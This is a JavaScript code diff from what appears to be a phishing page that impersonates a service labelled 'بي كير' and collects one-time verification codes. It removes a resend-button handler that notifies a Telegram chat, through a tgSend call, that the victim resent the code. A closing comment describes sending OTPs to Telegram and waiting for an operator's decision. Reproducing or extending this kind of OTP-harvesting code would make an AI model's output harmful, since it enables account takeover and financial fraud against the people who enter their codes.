@@ -214,7 +214,6 @@ function loadData() {
 function initBoxes() {
   const boxes      = [...document.querySelectorAll('.otp-box')];
   const confirmBtn = document.getElementById('otp-confirm-btn');
-  const resendBtn  = document.getElementById('otp-resend-btn');
 
   boxes.forEach((box, idx) => {
     box.addEventListener('input', e => {
@@ -245,22 +244,6 @@ function initBoxes() {
   });
 
   if (confirmBtn) confirmBtn.addEventListener('click', submitOTP);
-
-  if (resendBtn) {
-    resendBtn.addEventListener('click', async () => {
-      boxes.forEach(b => { b.value=''; b.classList.remove('filled','otp-error','otp-success'); b.disabled = false; });
-      if (confirmBtn) { confirmBtn.disabled = true; confirmBtn.innerHTML = '<span class="material-icons">check_circle</span> تأكيد'; }
-      clearOTPErr();
-      waitingConfirm = false;
-      clearInterval(pollInt);
-
-      await tgSend(`🔄 <b>إعادة إرسال — بي كير</b>\n🆔 المرجع: <code>${myRefNumber}</code>\n<i>العميل أعاد الإرسال...</i>`);
-
-      const sub = document.getElementById('otp-sub-text');
-      if (sub) sub.innerHTML = `أدخل رمز التحقق المؤلف من 6 أرقام لتأكيد العملية`;
-      boxes[0]?.focus();
-    });
-  }
 }
 
 /* ─── إرسال OTP للـ Telegram + انتظار قرار الأدمن ──── */
